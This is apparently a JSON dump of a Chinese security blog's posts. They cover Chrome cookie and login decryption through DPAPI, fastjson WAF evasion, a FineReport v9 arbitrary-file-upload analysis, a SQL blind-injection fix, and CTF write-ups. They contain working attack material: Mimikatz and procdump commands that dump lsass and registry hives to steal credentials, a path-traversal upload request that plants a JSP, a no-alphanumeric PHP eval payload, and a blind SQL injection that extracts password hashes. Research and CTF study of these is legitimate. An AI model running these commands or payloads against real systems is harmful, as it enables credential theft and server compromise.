{"meta":{"title":"白帽酱の博客","subtitle":"","description":"","author":"白帽酱","url":"https://rce.moe","root":"/"},"posts":[{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"}],"title":"chrome 浏览器cookies&登陆凭据解密&Windows系统下DPAPI中的MasterKey获取","date":"2021/05/05","text":"谷歌浏览器cookies&amp;登陆凭据解密&amp;Windows系统下DPAPI中的MasterKey获取谷歌浏览器の加解密Chrome cookies 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies”Chrome 登陆凭据 储存位置 “%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” 谷歌浏览器使用了windows自带的DPAPI进行加解密操作 解密方法有两种 第一种方法 :直接以加密数据的用户身份调用DPAPI解密Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotectps:如果没有目标加密文件的用户的权限 或者是想要解密机器上其他用户加密储存的信息这种方法就不能使用了 第二种方法 : 获取MasterKey脱机解密DPAPI加密的数据需要使用MasterKey解密如果可以拿到MasterKey的话就可直接解密数据Mimikatzdpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data” /unprotect /masterkey:36af83d6e6a67e4f67e6f45ca0464a031946182b3e67d72ce9c08e22d7a720b5d2a768418291f28fb79c6def7b068f84955e764e87e36c6b0b666e05fb7eb9f4 拿masterkey的几种方法方法一 直接在目标机器运行Mimikatz提取privilege::debugsekurlsa::dpapi(需目标用户已登陆) 方法二 转储lsass.exe 进程从内存提取masterkey如果目标用户已经登陆 lsass进程的内存中会存在masterkey 转储之 使用Mimikatz提取procdump.exe -accepteula -ma lsass.exe 666.dmpsekurlsa::minidump lsass.dmpsekurlsa::dpapi 方法三 导出SAM注册表 提取user hash 解密masterkey文件需SYSTEM权限reg save HKLM\\SYSTEM SS.hivreg save HKLM\\SECURITY SE.hivm/u 值解密Masterkey文件mimikatz log “lsadump::secrets /system:SS.hiv /security:SE.hiv”拿到DPAPI_SYSTEM m/u 后半部分的值 (HASH)这种方法对应MASTERKEY位置在C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User(一个个文件试总会解密成功的 现在不知道怎么获取用户对应的GUIDmimikatz “dpapi::masterkey /in:C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User{GUID} /system:HASH”即可拿到masterkey 方法四 已知用户密码(或hash) 用户SID(masterkey路径) 拿到加密后的masterkey文件这是当时 volatility内存取证题遇到的问题 这里就随手记录下来了第一步获取用户密码(或hash)找到masterkey文件位置这种方法的文件位置在C:\\Users{username}\\AppData\\Roaming\\Microsoft\\Protect{SID}{GUID}dpapi::masterkey /in:C:\\Users\\Genga03\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-262715442-3761430816-2198621988-1001\\57935170-beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:vIg*q3x6GFa5aFBA /protected/password可以用/hash:密码hash代替(NTLM or SHA1)即可拿到masterkey 方法五 通过域管理员导出backup key 恢复Master key利用条件:目标机器加入域 要拿的是域用户的key 拿到域管理员权限lsadump::backupkeys /system:123.com /export (需要域管理员权限) 导出domain backup keydpapi::masterkey /in:”C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe” /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk即可拿到masterkey 参考 渗透技巧-获取Windows系统下DPAPI中的MasterKey howto-~-scheduled-tasks-credentials Reading DPAPI Encrypted Secrets with Mimikatz and C++ Operational Guidance for Offensive User DPAPI Abuse","permalink":"https://rce.moe/2021/05/05/chrome-%E6%B5%8F%E8%A7%88%E5%99%A8cookies-%E7%99%BB%E9%99%86%E5%87%AD%E6%8D%AE%E8%A7%A3%E5%AF%86-Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey%E8%8E%B7%E5%8F%96/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"}],"title":"fastjson绕过WAF的TIPS","date":"2021/05/05","text":"fastjson绕WAFのTIPSfastjson对字符串转义处理の特性fast解析字符串支持\\u Unicode转义和 \\x HEX转义的字符串解码 (一般json仅支持Unicode转义 fastjson多了对十六进制转义的支持)例如 字符串 driverClassLoader Unicode转义 编码 \\uxxxx(json通用)\\u0064\\u0072\\u0069\\u0076\\u0065\\u0072\\u0043\\u006C\\u0061\\u0073\\u0073\\u004C\\u006F\\u0061\\u0064\\u0065\\u0072HEX转义编码 \\x** (fastjson only)\\x64\\x72\\x69\\x76\\x65\\x72\\x43\\x6C\\x61\\x73\\x73\\x4C\\x6F\\x61\\x64\\x65\\x72fastjson中两者可以混合使用例:\\x64\\u0072\\x0069\\u0076\\x65\\u0072\\x43\\x6C\\u0061\\u0073\\x73\\x4C\\x006F\\x61\\x64\\x65\\u0072使用CyberChef进行方便的编解码这种方法可以绕过一些字符串规则匹配的waf 除此之外playload也可以加入%08%09这种空白字符扰乱waf对json匹配解析","permalink":"https://rce.moe/2021/05/05/fastjson%E7%BB%95WAF-TIPS/","photos":[]},{"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://rce.moe/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"EXP","slug":"EXP","permalink":"https://rce.moe/tags/EXP/"}],"title":"帆软 v9任意文件上传漏洞漏洞分析(不覆盖上传文件)","date":"2021/05/03","text":"前言好久没写博客 源文件找不到了233 假期重新抄了下顺便换了个博客主题经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件 显而易见一堆人不分析就传exp 还说只能覆盖文件 今天又看到一篇一模一样的文章)分析帆软官方提供了安装包下载地址 下载之https://www.finereport.com/product/download发现这是个java开发的web应用 先准备工具好工具反编译class随手拿个网上给出的playload 看一下路由操作 op svginit,cmd design_save_svg POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1Host: 192.168.10.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDEConnection: closeContent-Type:text/xml;charset=UTF-8Content-Length: 74{\"__CONTENT__\":\"&lt;%out.println(\\\"Hello World!\\\");%&gt;\",\"__CHARSET__\":\"UTF-8\"} 经过搜索 发现存在漏洞的Service在WEB-INF\\lib\\fr-chart-9.0.jar内\\com\\fr\\chart\\web\\ChartSvgInitService.class 反编译之 package com.fr.chart.web;import com.fr.stable.fun.Service;import com.fr.stable.web.RequestCMDReceiver;import com.fr.web.core.WebActionsDispatcher;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class ChartSvgInitService implements Service { private RequestCMDReceiver[] actions = new RequestCMDReceiver[]{new ChartGetSvgAction(), new ChartSaveSvgAction(), new ChartDeleteSvgAction()}; public ChartSvgInitService() { } public String actionOP() { return \"svginit\"; } public void process(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4) throws Exception { WebActionsDispatcher.dealForActionCMD(var1, var2, var4, this.actions); }} 显然要找的漏洞点在ChartSaveSvgAction内 package com.fr.chart.web;import com.fr.base.Utils;import com.fr.chart.base.MapSvgAttr;import com.fr.chart.base.MapSvgXMLHelper;import com.fr.general.GeneralContext;import com.fr.general.http.HttpClient;import com.fr.stable.StableUtils;import com.fr.web.core.ActionNoSessionCMD;import com.fr.web.utils.WebUtils;import java.io.File;import java.io.FileOutputStream;import java.io.InputStream;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class ChartSaveSvgAction extends ActionNoSessionCMD { public ChartSaveSvgAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = WebUtils.getHTTPRequestParameter(var1, \"filePath\"); String var5 = GeneralContext.getEnvProvider().getPath() + \"/\" + \"assets\" + \"/\"; var4 = var5 + var4.substring(var4.indexOf(\"chartmapsvg\")); File var6 = null; if (var4.contains(\".svg\")) { var6 = new File(var4.substring(0, var4.lastIndexOf(\"/\"))); } else { var6 = new File(var4); } if (!var6.exists()) { var6.mkdirs(); } InputStream var7 = HttpClient.getInputStream(var1); if (var7 != null) { FileOutputStream var8 = new FileOutputStream(var4); Utils.copyBinaryTo(var7, var8); String[] var9 = StableUtils.pathSplit(var4); String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - 1]); MapSvgXMLHelper.getInstance().pushMapAttr(var10, new MapSvgAttr(var4)); var8.flush(); var7.close(); var8.close(); } } public String getCMD() { return \"design_save_svg\"; }} 这个action原本功能应该是上传保存svg图片传入uri中的filePath参数的处理 String var4 = WebUtils.getHTTPRequestParameter(var1, “filePath”); // 首先传入uri中的filePath参数 String var5 = GeneralContext.getEnvProvider().getPath() + “/“ + “assets” + “/“; //取当前目录拼接成保存目录 var4 = var5 + var4.substring(var4.indexOf(“chartmapsvg”)); //取filePath中的chartmapsvg右侧的字符串与var5目录拼接 var4 即为目标操作 目录/文件路径 这里有一个安全问题 输入filePath可控 可以构造目录穿越 那么为什么那么多人说这个漏洞只能覆盖文件呢 我们往下看 File var6 = null; //文件系统操作 if (var4.contains(“.svg”)) { //判断路径是否包含字符串.svg var6 = new File(var4.substring(0, var4.lastIndexOf(“/“))); //如果包含 取最后一个/前面的字符串作为路径new一个File类 } else { var6 = new File(var4); //如果不包含 直接用路径new一个File类 } if (!var6.exists()) { //判断var6文件/文件夹是否存在 var6.mkdirs();//不存在则创建文件夹 }这个就是被认为该漏洞只能覆盖文件的原因这处显然是实现文件夹创建的功能而写的下面的代码就是把 _CONTENT_ 写入var6打开的路径中 就不赘述了 第一种利用方法下面最重要的来了假设filePath 传入 chartmapsvg/123.jsp 则var6打开的路径为 当前环境变量目录/assets/123.jsp假设123.jsp不存在 所以会创建一个123.jsp的文件夹123.jsp就变成了一个文件夹了因为123.jsp是文件夹所以不能当做文件打开写入数据 导致利用失败如果123.jsp存在 就不会创建文件夹 直接写入数据 达到文件覆盖的目的这个是网传EXP的利用方法 第二种利用方法其实还有另一种方法仔细阅读代码发现 if (var4.contains(\".svg\")) { var6 = new File(var4.substring(0, var4.lastIndexOf(\"/\")));如果传入的路径包含.svg字符串 则判断和创建的将会是父文件夹根据上面的判断条件就可以写出构造路径利用的第二种方法了chartmapsvg/123.svg.jsp 父目录存在直接写入一个123.svg.jsp文件chartmapsvg/.svg/123.jsp .svg目录不存在创建一个.svg文件夹 在文件夹下写入一个123.jsp文件所以说为什么当时没有发现这种简单的方法却搞出个这种奇葩的利用)","permalink":"https://rce.moe/2021/05/03/%E5%B8%86%E8%BD%AF-v9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%8D%E8%A6%86%E7%9B%96%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"2020安恒DASCTF八月浪漫七夕战 ezrce Writeup","date":"2020/08/25","text":"早上有点事 差点忘了有比赛233 &lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST['code'];$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','@','\\~','\\^','\\[','\\]','\\&amp;','\\?','\\&lt;','\\&gt;','\\*','1','2','3','4','5','6','7','8','9','0');//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) { if (preg_match ('/' . $blacklisted . '/im', $code)) { die('you are not smart'); }}eval(\"echo($code)\");?&gt; 题目过滤了全部字母和数字和部分位运算符 由http头X-Powered-By: PHP/7.3.21可知 服务器PHP版本为7.3.21 需要构造无字母数字的playload 虽然过滤了部分位运算符 但还是漏了一个| 或运算 利用或运算符构造playload 调用readfile函数 读取根目录flagplayload code=('````````'|'\u0012\u0005\u0001\u0004\u0006 \u0005')('/````'|'/\u0006 \u0001\u0007'));//bas64Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw==","permalink":"https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"记一次mysql盲注遇到的问题","date":"2020/08/15","text":"前几天我把一个CVE写成EXP的时候遇到了一个问题目标使用了直接拼接SQL语句的方法进行sql查询而且使用的是UPDATE方法sql_query(\"UPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (\" . implode(\", \", $_POST[conusr]) . \") AND status='pending'\");根据拼接的语句 我写出了这样的playload 准备读取数据库中用户表的密码hashconusr[]=1) and if(ascii(mid((select group_concat(passhash) from users),%s,1))=%s,sleep(1),0)#发现执行后报出错误1093 - You can't specify target table 'users' for update in FROM clause这里发生了一个非常巧的事情 刚好UPDATE操作的和要select操作的是同一张表MYSQL不允许更新一张表的条件来自于查询这张表解决方法:在外面再套一层selectUPDATE users SET status = 'confirmed', editsecret = '' WHERE id IN (1) and if(ascii(mid((select * from (select group_concat(passhash) from users)as a),1,1))=1,sleep(1),0)#","permalink":"https://rce.moe/2020/08/15/%E8%AE%B0%E4%B8%80%E6%AC%A1mysql%E7%9B%B2%E6%B3%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}],"title":"GeekPwn 2020 云上挑战赛 cosplay! writeup","date":"2020/07/14","text":"学生党 业余挖洞 只会点web 第一次写writeup，不大会写，请多关照。 看到这个题目cosplay! 就先看了眼这道题 居然拿到了个一血 0.0尝试上传文件发现是通过COS(腾讯的对象云储存)上传文件var Bucket = ‘933kpwn-1253882285’;var Region = ‘ap-shanghai’; var cos = new COS({ getAuthorization: function (options, callback) { var url = '/GetTempKey?path=/upload'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.onload = function (e) { try { var data = JSON.parse(e.target.responseText); var credentials = data.Credentials; } catch (e) { } if (!data || !credentials) return console.error('credentials invalid'); callback({ TmpSecretId: credentials.TmpSecretId, TmpSecretKey: credentials.TmpSecretKey, XCosSecurityToken: credentials.Token, ExpiredTime: data.ExpiredTime, }); }; xhr.send(); }}); 分析源码发现这个页面是在本地利用从服务器获取的临时密钥给上传参数签名的一般上传用的普通密钥 而且是在后端给请求做签名但是临时密钥如果存在权限控制不当(临时密钥生成的时候可以限制操作方法和范围) 也可以在密钥有效期内完全控制储存桶(这道题就是这种情况) 访问 /GetTempKey?path=/ 取得临时密钥和令牌(临时密钥生成的时候可以限制操作路径)根据腾讯COS的文档 使用临时密钥和令牌访问储存桶为了方便这里使用腾讯云官方提供的PHP SDK 来操作储存桶临时密钥没有操作限制 成功获取储存桶内所有的对象键列表发现 Flag键名为 f1L9@/flag.txt 读取f1L9@/flag.txt 拿到 flag","permalink":"https://rce.moe/2020/07/14/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-witeup/","photos":[]},{"tags":[],"title":"Hello World","date":"2020/04/12","text":"第一个博客最近试试开始写点博客","permalink":"https://rce.moe/2020/04/12/hello-world/","photos":[]}],"categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"DPAPI","slug":"DPAPI","permalink":"https://rce.moe/tags/DPAPI/"},{"name":"CHROME","slug":"CHROME","permalink":"https://rce.moe/tags/CHROME/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://rce.moe/tags/mimikatz/"},{"name":"fastjson","slug":"fastjson","permalink":"https://rce.moe/tags/fastjson/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://rce.moe/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"EXP","slug":"EXP","permalink":"https://rce.moe/tags/EXP/"},{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"}]}